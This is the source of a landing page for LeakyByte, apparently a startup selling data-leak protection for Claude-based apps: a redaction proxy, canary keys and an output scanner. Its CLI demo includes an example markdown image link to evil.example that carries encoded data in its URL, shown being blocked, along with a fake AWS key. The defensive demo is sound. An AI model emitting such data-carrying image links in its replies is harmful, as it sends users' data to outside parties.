import Playground from "@/components/Playground";

const EMAIL = "hello@leakybyte.xyz";

const products = [
  ["Veil", "Before the model", "A proxy for the Claude API. It swaps API keys and personal data for placeholders on the way out and restores them in the reply."],
  ["Canary", "In your data", "Mint fake keys that look real and plant them in configs, docs and prompts. If one shows up in a log or an output, you know where it leaked from."],
  ["Plug", "After the model", "Scans model output for ways data escapes: image links that carry data in the URL, invisible text, and secrets. It blocks them before your app renders the reply."],
] as const;

const detects = [
  ["API keys", "Anthropic, AWS, GitHub, generic sk- keys"],
  ["Tokens", "JWTs"],
  ["Contact details", "Emails, phone numbers"],
  ["Financial", "Card numbers (Luhn-checked)"],
  ["Identity and network", "US SSNs, IPv4 addresses"],
];

const snippet = `import Anthropic from "@anthropic-ai/sdk";

const client = new Anthropic({
  baseURL: "http://127.0.0.1:8787", // Veil proxy
});

// Everything else stays the same.
const msg = await client.messages.create({ ... });`;

const cli = `$ npm run lb canary mint prod aws
AKIAPRODC3EDOIU4P2TK

$ echo "env: AWS_ACCESS_KEY_ID=AKIAPRODC3EDOIU4P2TK" | npm run lb canary check
LEAK: aws canary "PROD" at char 28

$ echo 'hi ![x](https://evil.example/a.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ=)' | npm run lb plug
hi ![x]([blocked link to evil.example])
URL: evil.example carries data in the query string

$ npm test
ℹ pass 8   ℹ fail 0`;

export default function Home() {
  return (
    <>
      <header className="mx-auto flex max-w-6xl items-center justify-between px-6 py-6">
        <a href="#" className="font-display text-xl font-bold tracking-tight">
          Leaky<span className="bar font-display">Byte</span>
        </a>
        <nav className="flex items-center gap-6 text-sm text-muted">
          <a className="hover:text-paper" href="#try">Try it</a>
          <a className="hover:text-paper" href="#products">Products</a>
          <a className="hover:text-paper" href="#use">Use it</a>
          <a className="rounded bg-paper px-3 py-1.5 font-medium text-ink" href="#access">Early access</a>
        </nav>
      </header>

      <main>
        <section id="try" className="mx-auto max-w-6xl scroll-mt-8 px-6 pb-20 pt-16 md:pt-24">
          <h1 className="max-w-4xl font-display text-5xl font-extrabold leading-[1.02] tracking-tight md:text-7xl">
            Stop your AI app from leaking data.
          </h1>
          <p className="mt-6 max-w-xl text-lg leading-relaxed text-muted">
            Three small tools for teams building on Claude: one before the model, one in your data, one after the model.
            Try each one below. Everything runs in your browser and nothing is sent anywhere.
          </p>
          <div className="mt-12"><Playground /></div>
        </section>

        <section id="products" className="mx-auto max-w-6xl scroll-mt-8 px-6 py-20">
          <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">One request, three places to leak</h2>
          <p className="mt-4 max-w-2xl leading-relaxed text-muted">
            Data leaves an AI app before the model sees it, from the files you hand it, and in what it says back. Each product
            covers one of those, and they share one detection engine.
          </p>
          <div className="mt-10 grid gap-px overflow-hidden rounded-lg border border-edge bg-edge md:grid-cols-3">
            {products.map(([name, where, desc]) => (
              <div key={name} className="bg-raise p-6">
                <p className="text-sm text-lit">{where}</p>
                <h3 className="mt-2 font-display text-2xl font-bold">{name}</h3>
                <p className="mt-3 leading-relaxed text-muted">{desc}</p>
              </div>
            ))}
          </div>
        </section>

        <section id="use" className="mx-auto grid max-w-6xl scroll-mt-8 gap-12 px-6 py-20 md:grid-cols-2">
          <div>
            <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">Veil is one line to adopt</h2>
            <p className="mt-4 max-w-md leading-relaxed text-muted">
              The proxy speaks the Claude Messages API, including streaming, so changing the base URL is the whole integration.
              Your Anthropic key passes straight through and is never stored. The audit log records what kinds of values were
              swapped, never the values.
            </p>
            <dl className="mt-8 space-y-3">
              {detects.map(([k, v]) => (
                <div key={k} className="flex gap-4 border-t border-edge pt-3 text-sm">
                  <dt className="w-40 shrink-0 font-medium">{k}</dt>
                  <dd className="text-muted">{v}</dd>
                </div>
              ))}
            </dl>
          </div>
          <pre className="self-start overflow-x-auto rounded-lg border border-edge bg-raise p-5 font-mono text-sm leading-relaxed">
            <code>{snippet}</code>
          </pre>
        </section>

        <section className="mx-auto grid max-w-6xl gap-12 px-6 py-20 md:grid-cols-2">
          <div>
            <h2 className="font-display text-3xl font-bold tracking-tight md:text-4xl">Where we are</h2>
            <p className="mt-4 max-w-md leading-relaxed text-muted">
              LeakyByte is early. All three tools work today, in the browser and from a command line. Veil also runs as a local
              proxy that restores replies in normal and streaming responses and writes an audit log. The tests run the proxy
              against a mock Claude server. Still to come: Plug and Canary checks inside the proxy, a hosted version, a
              dashboard, and wider checks against the live API. We build with Claude Code.
            </p>
          </div>
          <pre className="self-start overflow-x-auto rounded-lg border border-edge bg-raise p-5 font-mono text-sm leading-relaxed">
            <code>{cli}</code>
          </pre>
        </section>

        <section id="access" className="mx-auto max-w-6xl scroll-mt-8 px-6 pb-28 pt-12">
          <div className="rounded-lg bg-paper p-8 text-ink md:p-12">
            <h2 className="max-w-2xl font-display text-3xl font-bold tracking-tight md:text-5xl">
              Shipping on Claude? Help us shape this.
            </h2>
            <p className="mt-4 max-w-xl leading-relaxed">
              Tell us what your app sends to the model and what worries you about it. We reply to every message.
            </p>
            <a
              href={`mailto:${EMAIL}?subject=LeakyByte%20early%20access`}
              className="mt-8 inline-block rounded bg-ink px-5 py-3 font-medium text-paper"
            >
              Email {EMAIL}
            </a>
          </div>
        </section>
      </main>

      <footer className="mx-auto max-w-6xl px-6 pb-10 text-sm text-muted">
        © 2026 LeakyByte. Not affiliated with Anthropic.
      </footer>
    </>
  );
}
